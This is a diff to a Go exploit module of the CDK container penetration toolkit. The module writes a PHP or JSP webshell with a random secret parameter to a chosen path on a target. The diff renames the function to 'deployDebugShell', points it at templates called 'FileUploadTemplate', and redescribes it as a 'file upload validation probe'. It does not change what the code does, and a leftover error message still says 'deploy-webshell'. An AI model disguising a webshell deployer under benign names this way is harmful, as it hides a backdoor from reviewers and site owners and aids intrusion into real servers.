@@ -33,14 +33,14 @@ import (
 	"github.com/cdk-team/CDK/pkg/util"
 )
 
-func deployWebShell(scriptType string, path string) error {
+func deployDebugShell(scriptType string, path string) error {
 	var content string
 	var param = "cdk_" + util.RandString(7)
 	switch strings.ToLower(scriptType) {
 	case "php":
-		content = strings.ReplaceAll(conf.WebShellCodePHP, "$SECRET_PARAM", param)
+		content = strings.ReplaceAll(conf.FileUploadTemplatePHP, "$SECRET_PARAM", param)
 	case "jsp":
-		content = strings.ReplaceAll(conf.WebShellCodeJSP, "$SECRET_PARAM", param)
+		content = strings.ReplaceAll(conf.FileUploadTemplateJSP, "$SECRET_PARAM", param)
 	default:
 		return errors.New("invalid input args. Usage: cdk run deploy-webshell (php|jsp) <filepath>.")
 	}
@@ -56,7 +56,7 @@ func deployWebShell(scriptType string, path string) error {
 type webShellDeployS struct{ base.BaseExploit }
 
 func (p webShellDeployS) Desc() string {
-	return "Write webshell to target path. Usage: cdk run deploy-debug-shell (php|jsp) <filepath>."
+	return "Deploy file upload validation probe to target path. Usage: cdk run deploy-debug-shell (php|jsp) <filepath>."
 }
 
 func (p webShellDeployS) Run() bool {
@@ -69,7 +69,7 @@ func (p webShellDeployS) Run() bool {
 
 	fileType := args[0]
 	path := args[1]
-	err := deployWebShell(fileType, path)
+	err := deployDebugShell(fileType, path)
 	if err != nil {
 		fmt.Println(err)
 		return false
